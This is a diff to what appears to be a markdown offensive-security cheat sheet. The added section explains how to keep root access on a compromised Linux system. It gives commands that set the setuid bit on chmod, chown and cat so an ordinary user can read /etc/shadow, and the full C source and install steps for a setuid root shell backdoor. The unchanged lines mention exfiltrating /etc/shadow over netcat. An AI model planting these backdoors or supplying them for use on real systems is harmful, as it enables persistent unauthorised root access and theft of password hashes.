@@ -47,3 +47,29 @@ int main() {
 
 **Execute** `ptshijack` **on (B) to send** `/etc/shadow` **from (C) to (A)**<br />
 SIGINT (ctrl-c) netcat on (A) to terminate the background process on (C)<br />
+
+## Persistence with setuid
+
+Once you have root on a system leave these behind to exploit later:<br >
+* `chmod u+s /usr/bin/chmod` and `chmod u+s /usr/bin/chown`, will allow you to create files as an ordinary user that execute as root.
+* `chmod u+s /usr/bin/cat` will allow you to view `/etc/shadow` as an ordinary user.
+* Compile the following C program and setuid as root.<br />
+```c
+// gcc -o setuid-shell setuid-shell.c
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <grp.h>
+
+int main(int argc, char **argv)
+{
+   initgroups("root", 0);
+   setgid(0);
+   setuid(0);
+   execve("/bin/bash", NULL, NULL);
+
+   return 0;
+}
+```<br />
+setuid as root `chown root:root setuid-shell` then `chmod u+s setuid-shell`<br />
+Now execute `setuid-shell` and see that you are root by using the `id` command.
